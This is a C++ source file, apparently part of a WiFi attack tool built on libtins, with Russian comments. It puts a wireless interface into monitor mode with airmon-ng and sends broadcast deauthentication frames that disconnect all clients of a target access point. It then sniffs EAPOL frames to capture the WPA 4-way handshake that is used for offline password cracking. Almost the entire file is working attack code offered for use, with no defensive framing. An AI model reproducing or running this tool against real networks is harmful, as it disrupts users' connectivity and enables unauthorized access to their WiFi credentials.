#include "attacker.hpp"
#include <iostream>
#include <thread>
#include <chrono>
#include <tins/tins.h>

using namespace Tins;

volatile bool handshake_captured = false;

// Исправленный callback для обработки пакетов
bool eapol_callback(const PDU& pdu) {
    if (handshake_captured) return false;
    
    const Dot11* dot11 = pdu.find_pdu<Dot11>();
    // В новых версиях libtins класс называется EAPOL, не Dot11EAPOL
    const EAPOL* eapol = pdu.find_pdu<EAPOL>();
    
    if (dot11 && eapol) {
        static int eapol_count = 0;
        eapol_count++;
        // В новых версиях addr2 называется addr2 (должно работать)
        // Если нет — используем dot11->addr1() или dot11->addr3()
        std::cout << "[+] EAPOL packet #" << eapol_count 
                  << " from " << dot11->addr1() << std::endl;
        
        if (eapol_count >= 4) {
            std::cout << "[+] Full 4-way handshake captured!" << std::endl;
            handshake_captured = true;
            return false;
        }
    }
    return true;
}

bool setup_monitor_mode(const std::string& interface) {
    std::cout << "[*] Setting up monitor mode on " << interface << "..." << std::endl;
    
    system("sudo airmon-ng check kill > /dev/null 2>&1");
    
    std::string cmd = "sudo airmon-ng start " + interface + " > /dev/null 2>&1";
    int ret = system(cmd.c_str());
    
    // Проверяем, создался ли интерфейс wlan0mon
    std::string check_cmd = "iwconfig 2>/dev/null | grep -q " + interface + "mon";
    int check = system(check_cmd.c_str());
    
    if (ret != 0 || check != 0) {
        std::cerr << "[-] Failed to enable monitor mode" << std::endl;
        return false;
    }
    
    std::cout << "[+] Monitor mode enabled on " << interface << "mon" << std::endl;
    return true;
}

void cleanup_monitor_mode(const std::string& interface) {
    std::cout << "[*] Cleaning up..." << std::endl;
    std::string stop_cmd = "sudo airmon-ng stop " + interface + "mon > /dev/null 2>&1";
    system(stop_cmd.c_str());
    system("sudo systemctl restart NetworkManager > /dev/null 2>&1");
}

bool set_channel(const std::string& interface, int channel) {
    std::string cmd = "sudo iwconfig " + interface + " channel " + std::to_string(channel);
    int ret = system(cmd.c_str());
    if (ret != 0) {
        std::cerr << "[-] Failed to set channel to " << channel << std::endl;
        return false;
    }
    std::cout << "[+] Set channel to " << channel << std::endl;
    return true;
}

bool send_deauth(const std::string& interface, const std::string& bssid) {
    std::cout << "[*] Sending deauth to " << bssid << "..." << std::endl;
    
    try {
        PacketSender sender;
        RadioTap radio;
        Dot11Deauthentication deauth;
        
        // Широковещательная рассылка (отключаем всех клиентов)
        deauth.addr1("FF:FF:FF:FF:FF:FF");
        deauth.addr2(bssid);
        deauth.addr3(bssid);
        
        radio /= deauth;
        
        for (int i = 0; i < 5; ++i) {
            sender.send(radio, interface);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        std::cout << "[+] Deauth sent" << std::endl;
        return true;
        
    } catch (const std::exception& e) {
        std::cerr << "[-] Deauth failed: " << e.what() << std::endl;
        return false;
    }
}

// Исправленная функция захвата handshake
bool capture_handshake(const std::string& interface, const std::string& bssid, int channel, int timeout_seconds) {
    std::cout << "[*] Starting handshake capture on channel " << channel << std::endl;
    std::cout << "[*] Timeout: " << timeout_seconds << " seconds" << std::endl;
    std::cout << "[*] Waiting for EAPOL packets..." << std::endl;
    
    if (!set_channel(interface, channel)) {
        return false;
    }
    
    handshake_captured = false;
    
    // Используем SnifferConfiguration для фильтра
    SnifferConfiguration config;
    config.set_filter("ether proto 0x888e");
    config.set_promisc_mode(true);
    config.set_timeout(timeout_seconds);
    
    try {
        Sniffer sniffer(interface, config);
        sniffer.sniff_loop(eapol_callback);
        return handshake_captured;
    } catch (const std::exception& e) {
        std::cerr << "[-] Sniffer error: " << e.what() << std::endl;
        return false;
    }
}

bool attack_network(const WiFiNetwork& target) {
    std::string monitor_interface = "wlan0mon";
    
    if (!setup_monitor_mode("wlan0")) {
        return false;
    }
    
    // Небольшая пауза для инициализации
    std::this_thread::sleep_for(std::chrono::seconds(2));
    
    std::cout << "\n[*] Target: " << target.ssid << " (" << target.bssid << ")" << std::endl;
    std::cout << "[*] Channel: " << target.channel << std::endl;
    
    bool success = false;
    
    std::cout << "[*] Listening for handshake (5 seconds without deauth)..." << std::endl;
    if (capture_handshake(monitor_interface, target.bssid, target.channel, 5)) {
        success = true;
    } else {
        std::cout << "[*] No handshake detected. Sending deauth to force reconnection..." << std::endl;
        send_deauth(monitor_interface, target.bssid);
        success = capture_handshake(monitor_interface, target.bssid, target.channel, 55);
    }
    
    cleanup_monitor_mode("wlan0");
    
    return success;
}
